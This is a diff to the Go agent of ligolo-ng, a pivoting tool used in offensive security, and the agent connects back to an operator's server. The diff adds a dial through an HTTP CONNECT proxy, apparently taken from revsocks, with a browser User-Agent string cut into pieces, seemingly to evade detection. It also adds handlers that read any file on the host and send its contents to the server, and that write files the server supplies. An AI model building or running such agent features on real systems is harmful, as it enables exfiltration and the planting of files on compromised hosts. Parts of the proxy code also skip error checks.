@@ -1,24 +1,27 @@
 package main
 
 import (
+	"bufio"
 	"context"
 	"crypto/tls"
 	"errors"
 	"flag"
 	"fmt"
-	"ligolo-ng/pkg/agent/neterror"
-	"ligolo-ng/pkg/agent/smartping"
-	"ligolo-ng/pkg/protocol"
-	"ligolo-ng/pkg/relay"
 	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"os/user"
 	"runtime"
+	"strings"
 	"syscall"
 	"time"
 
 	"github.com/hashicorp/yamux"
+	"github.com/nicocha30/ligolo-ng/pkg/agent/neterror"
+	"github.com/nicocha30/ligolo-ng/pkg/agent/smartping"
+	"github.com/nicocha30/ligolo-ng/pkg/protocol"
+	"github.com/nicocha30/ligolo-ng/pkg/relay"
 	"github.com/sirupsen/logrus"
 	goproxy "golang.org/x/net/proxy"
 )
@@ -33,14 +36,13 @@ func main() {
 	var ignoreCertificate = flag.Bool("ignore-cert", false, "ignore TLS certificate validation (dangerous), only for debug purposes")
 	var verbose = flag.Bool("v", false, "enable verbose mode")
 	var retry = flag.Bool("retry", false, "auto-retry on error")
+	var httpProxy = flag.String("http", "", "http proxy address (ip:port)")
 	var socksProxy = flag.String("socks", "", "socks5 proxy address (ip:port)")
 	var socksUser = flag.String("socks-user", "", "socks5 username")
 	var socksPass = flag.String("socks-pass", "", "socks5 password")
 	var serverAddr = flag.String("connect", "", "the target (domain:port)")
 
 	flag.Parse()
-
-	//reg.WinAutostart()
 
 	logrus.SetReportCaller(*verbose)
 
@@ -73,6 +75,14 @@ func main() {
 				logrus.Fatal("invalid socks5 address, please use host:port")
 			}
 			conn, err = sockDial(*serverAddr, *socksProxy, *socksUser, *socksPass)
+		} else if *httpProxy != "" {
+			if _, _, err := net.SplitHostPort(*httpProxy); err != nil {
+				logrus.Fatal("invalid http proxy address, please use host:port")
+			}
+			conn = simpleproxyDial(*httpProxy, *serverAddr)
+			if conn == nil {
+				logrus.Fatal("proxy refused connection")
+			}
 		} else {
 			conn, err = net.Dial("tcp", *serverAddr)
 		}
@@ -86,6 +96,39 @@ func main() {
 		} else {
 			logrus.Fatal(err)
 		}
+	}
+}
+
+// rip from revsocks
+
+func simpleproxyDial(proxyaddr string, connectaddr string) net.Conn {
+
+	connectproxystring := "CONNECT " + connectaddr + " HTTP/1.1" + "\r\nHost: " + connectaddr +
+		"\r\nUser-Agent: Mozilla" + "/5.0 (Windows N" + "T 10.0; Win64; x64) Appl" + "eWebKit/537.36 (KHTML, like Gecko) Chr" + "ome/42.0.2311.135 Safari/537.36 Ed" + "ge/12.246" +
+		"\r\nProxy-Connection: Keep-Alive" +
+		"\r\n\r\n"
+
+	conn, err := net.Dial("tcp", proxyaddr)
+	if err != nil {
+		logrus.Errorf("Error connect: %v", err)
+	}
+	conn.Write([]byte(connectproxystring))
+
+	time.Sleep(time.Millisecond * 1000) //Because socket does not close - we need to sleep for full response from proxy
+
+	resp, err := http.ReadResponse(bufio.NewReader(conn), &http.Request{Method: "CONNECT"})
+	status := resp.Status
+
+	if (resp.StatusCode == 200) || (strings.Contains(status, "HTTP/1.1 200 ")) ||
+		(strings.Contains(status, "HTTP/1.0 200 ")) {
+		logrus.Info("Connected via proxy")
+		return conn
+	} else if resp.StatusCode == 407 {
+		logrus.Error("proxy auth required (407)")
+		return nil
+
+	} else {
+		return nil
 	}
 }
 
@@ -154,7 +197,9 @@ func (s *Listener) Close() error {
 func handleConn(conn net.Conn) {
 	decoder := protocol.NewDecoder(conn)
 	if err := decoder.Decode(); err != nil {
-		panic(err)
+		//panic(err)
+		logrus.Errorf("handleConn pb %v", err)
+		return
 	}
 
 	e := decoder.Envelope.Payload
@@ -276,6 +321,59 @@ func handleConn(conn net.Conn) {
 
 		if err := encoder.Encode(protocol.Envelope{
 			Type:    protocol.MessageCmdReply,
+			Payload: infoResponse,
+		}); err != nil {
+			logrus.Fatal(err)
+		}
+
+	case protocol.MessageFileRecvRequest:
+		var sout string
+
+		encoder := protocol.NewEncoder(conn)
+		file := e.(protocol.MessageFileRecvRequestPacket)
+
+		content, err := os.ReadFile(file.File)
+
+		if err != nil {
+			sout = fmt.Sprintf("unable to read file %s : %v", file.File, err)
+		} else {
+			sout = fmt.Sprintf("download %s ok len : %v", file.File, len(content))
+		}
+
+		infoResponse := protocol.MessageFileRecvResponsePacket{
+			Response: fmt.Sprintf(sout),
+			Content:  content,
+		}
+
+		if err := encoder.Encode(protocol.Envelope{
+			Type:    protocol.MessageFileRecvReply,
+			Payload: infoResponse,
+		}); err != nil {
+			logrus.Fatal(err)
+		}
+
+	case protocol.MessageFileSendRequest:
+
+		sout := ""
+
+		encoder := protocol.NewEncoder(conn)
+		file := e.(protocol.MessageFileSendRequestPacket)
+
+		f, err := os.Create(file.File)
+
+		if err != nil {
+			sout = string(" upload " + file.File + " failed : " + err.Error())
+		} else {
+			f.Write([]byte(file.Content))
+			f.Close()
+			sout = string(" upload " + file.File + " ok ")
+		}
+
+		infoResponse := protocol.MessageFileSendResponsePacket{
+			Response: fmt.Sprintf(sout),
+		}
+		if err := encoder.Encode(protocol.Envelope{
+			Type:    protocol.MessageFileSendReply,
 			Payload: infoResponse,
 		}); err != nil {
 			logrus.Fatal(err)
